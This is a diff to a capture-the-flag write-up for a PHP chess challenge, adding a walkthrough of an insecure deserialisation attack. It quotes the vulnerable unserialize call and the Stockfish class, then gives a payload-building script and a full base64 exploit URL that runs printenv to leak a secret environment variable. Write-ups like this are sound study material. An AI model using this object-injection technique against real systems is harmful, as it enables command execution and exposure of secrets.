@@ -154,18 +154,114 @@ The run returns `500` status code and the content of the environment variables i
 We visited the URL listed in the `REDIRECT_FLAG` and the challenge got marked as completed. 🎉
 
 # Alternative 2 
-We still believe there would be a way to exploit the html comment and get the flag that way. See `Step 14`.
+Alternative way to get the flag is through insecure deserialisation. See `Step 14`.
 
 ## Step 18
-We realised that the base64 decoded string is a serialised version of php code. Discovered using [W3Schools](https://www.w3schools.com/php/func_var_unserialize.asp)
-e.g.
+We are getting a serialized object as a GET request parameter.
 ```
-a:3:{i:0;s:3:"Red";i:1;s:5:"Green";i:2;s:4:"Blue";}
+    $movei = unserialize(base64_decode($_GET['move_end']));
+    ...
+    echo \"<!-- XXX : Debug remove this \".$movei. \"-->\";
+``` 
+
+When the object is serialized in PHP, an example object that has a string and boolean properties is converted into a string that has the following structure:
 ```
-is
+O:QUANTITY_OF_CHARACTERS:"NAME_OF_CLASS":NUMBER_OF_PROPERTIES:{s: QUANTITY_OF_CHARACTERS: NAME_STRING;b: BOOLEAN_VALUE;}
 ```
-array(2) { [0]=> string(2) "d2" [1]=> string(2) "d3" }
+Because we are passing a serialized object as a parameter and then we are deserializing and printing it, we control what to pass as a parameter. Luckily for us, we have the knowledge about the existing classes. We can try to pass `getenv(REDIRECT_FLAG)` as a value of one of properties of the class. One problem is that the function `getenv(REDIRECT_FLAG)` is executed before the object is serialized, thus value of redirect flag environment variable is serilized, not the string `getenv(REDIRECT_FLAG)`. One of interesting ones is `Stockfish`.
+
+### Class Stockfish
 ```
+class Stockfish
+{
+    public $cwd = "./";
+    public $binary = "/usr/games/stockfish";
+    public $other_options = array('bypass_shell' => 'true');
+    public $descriptorspec = array(
+        0 => array("pipe","r"),
+                1 => array("pipe","w"),
+    );
+    private $process;
+    private $pipes;
+    private $thinking_time;
+
+    public function __construct()
+    {
+        $other_options = array('bypass_shell' => 'true');
+        //echo "Stockfish options" . $_SESSION['thinking_time'];
+        if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time'])) {
+            $this->thinking_time = $_SESSION['thinking_time'];
+            echo '<!-- getting thinking time from admin.php -->';
+            echo '<!-- setting thinking time to ' . $this->thinking_time . '-->';
+        } else {
+            $this->thinking_time = 10;
+        }
+        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
+    }
+    public function passUci()
+    {
+        if (is_resource($this->process)) {
+            fwrite($this->pipes[0], "uci\n");
+            fwrite($this->pipes[0], "ucinewgame\n");
+            fwrite($this->pipes[0], "isready\n");
+        }
+    }
+
+    public function passPosition(string $fen)
+    {
+        fwrite($this->pipes[0], "position fen $fen\n");
+        fwrite($this->pipes[0], "go movetime $this->thinking_time\n");
+    }
+
+    public function readOutput()
+    {
+        while (true) {
+            usleep(100);
+            $s = fgets($this->pipes[1], 4096);
+            $str .= $s;
+            if (strpos(' '.$s, 'bestmove')) {
+                break;
+            }
+        }
+        return $s;
+    }
+
+    public function __toString()
+    {
+        return fgets($this->pipes[1], 4096);
+    }
+
+    public function __wakeup()
+    {
+        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
+        echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
+    }
+}
+```
+The class has a property `binary`. We can set the value of this property to a path to executable binary. We know that we can set the value of environment variable with `env` and print it  with `printenv` in Linux. Let's use this knowledge.
 
 ## Step 19
+We opened a php code editor to prepare the payload.
+```
+<?php
+class Stockfish
+{
 
+}
+
+
+$myObj = new Stockfish();
+$myObj->binary=array("/usr/bin/printenv","REDIRECT_FLAG");
+$data=base64_encode(serialize($myObj));
+echo $data;
+?>
+```
+
+
+## Step 20
+Now we can craft the payload and send the following request:
+```
+https://hackerchess-web.h4ck.ctfcompetition.com/?move_end=Tzo5OiJTdG9ja2Zpc2giOjE6e3M6NjoiYmluYXJ5IjthOjI6e2k6MDtzOjE3OiIvdXNyL2Jpbi9wcmludGVudiI7aToxO3M6MTM6IlJFRElSRUNUX0ZMQUciO319
+```
+
+The value of environmental variable REDIRECT_FLAG will be printed in the aforementioned comment.
